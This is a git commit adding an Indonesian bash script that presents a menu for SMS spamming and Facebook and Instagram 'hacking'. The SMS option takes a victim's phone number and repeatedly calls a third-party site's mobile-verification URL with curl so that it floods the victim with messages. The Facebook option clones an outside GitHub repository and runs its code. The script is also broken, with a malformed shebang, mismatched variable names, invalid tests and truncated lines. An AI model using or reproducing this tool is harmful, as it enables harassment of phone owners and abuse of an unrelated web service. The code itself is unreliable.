5ad41b552ce9d3fb52dbc905885eacef8e4df393
WhoMHw <71681090+WhoMHw@users.noreply.github.com>
2020-10-17 13:46:10 +0700

    Add files via upload

---
+++ WhoMHw.sh
@@ -0,0 +1,115 @@
+#/!/bin/bash
+echo "selamat datang kaka siapa nama  kakak?" #tulisankeluar
+read nick #membaca tulisan
+echo "Dasar jones  :("
+echo "-_-_-_-_-_-_--_-_-_-__-__-_-_-_-_____-_-_-_-_-_-_-_--_-_-_-_-_-_ "
+sleep 0.03
+echo "        __-WhoMHW_________________-__-_-____--_-_-_-_-_-_-_-_-__"
+sleep 0.03
+echo "   WA gua :085336515***____________-_-__________________________  "
+echo " _-_-_--__--_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__--_--_-_-_-_-_ "
+echo
+echo
+clear
+
+echo "lo gak usah kenal gue ama nomor Wa gue"
+sleep 0.03
+echo " ehh.. btw nama lo tadi jones ya!"
+sleep 0.03
+echo
+echo "WeLcOmE Jones :("
+echo
+echo "1""2""3"
+echo
+echo " Nama lo tadi.!" $nick
+sleep 0.03
+echo "_________________________---------------_____"
+echo "gw kira Tadi lo jomblo tod :)"
+echo
+echo "tools ini jangan dibuat sembarangan"
+echo "__________________________----------------_____"
+echo "Spam snst(1)"
+sleep 0.03
+
+echo "Hack fb bot(2)"
+
+echo "hack ig(3)"
+sleep 0.03
+
+echo
+read -p "[?] Pilih ; "pill:
+#batas gan
+if [ $pil -1 ]
+then
+ echo "install dulu" $nick
+r="\033[31;1m"
+y="\033[33;1m"
+yl="\033[1;33m"
+g="\033[0;32m"
+gl="\033[32;1m"
+b="\033[0;36m"
+bl="\033[36;1m"
+c="\033[36;1m"
+p="\033[0;35m"
+o="\033[0m"
+
+cek(){
+command -v curl > /dev/null 2>&1 || { echo >&2 "curl belum terinstall ketik >> pkg install curl -y";>
+command -v cowsay > /dev/null 2>&1 || { echo >&2 "cowsay belum terinstall ketik >> pkg install cowsa>
+command -v ruby > /dev/null 2>&1 || { echo >&2 "ruby belum terinstall ketik >> pkg install ruby -y d>
+}
+mulai(){
+echo ""
+sleep 0.1
+echo -e "             \033[90m~  ~  ~  \033[1;32m 🖕(\033[1;31mFucK🌑YoU\033[1;32m)🖕\033[90m   ~  ~>
+echo -e "\033[1;37m                  Jangan Lupa Senyum😁(\033[1;32m2.0\033[1;37m)"
+echo -e "\033[1;34m╔═══════════════════════════════════════════════════════╗"
+echo -e "\033[1;34m║  \033[90m{\033[1;31m•\033[90m}  \033[1;37mAuthor    :   \033[1;36mWho MHw     \>
+echo -e "\033[1;34m║\033[90m  {\033[1;31m•\033[90m} \033[1;37m Youtube   : \033[1;36m  Kepo😂\033[1;>
+echo -e "\033[1;34m║\033[90m  {\033[1;31m•\033[90m} \033[1;37m Github    :\033[1;32m   No github  \0>
+echo -e "\033[1;34m╚═══════════════════════════════════════════════════════╝"
+echo -e "\033[1;37mMasukan Nomor Tanpa (0/62)"
+sleep 0.1
+echo -e "\033[1;37mMASUKAN NO TARGET \033[1;32m " ;read -p "=> " nomor
+link="https://id.jagreward.com/member/verify-mobile/$nomor"
+gas="curl -s $link"
+sleep 0.1
+echo -e "\e[1;37mMESSAGE\033[1;32m"
+sleep 0.1
+$gas
+echo -e "${o}"
+sleep 0.2
+}
+ulang(){
+echo ""
+echo -e "${o}Coba Lagi ?"
+echo -e "${o}y${o}/${o}n${g}"
+read -p "=> " ula
+if [[ $ula == "y" ]]; then
+u
+elif [[ $ula == "n" ]]; then
+exit
+else
+echo -e "${r}Pilih y/n  "
+ulang
+fi
+}
+u(){
+mulai
+ulang
+}
+i(){
+cek
+mulai
+}
+mulai
+lagi
+fi
+#batas gan
+ if[ $pilih -2 ]
+then
+git clone https://github.com/BOT-033/Sensei
+cd Sensei
+python2 main.py
+fi
+#batas gan
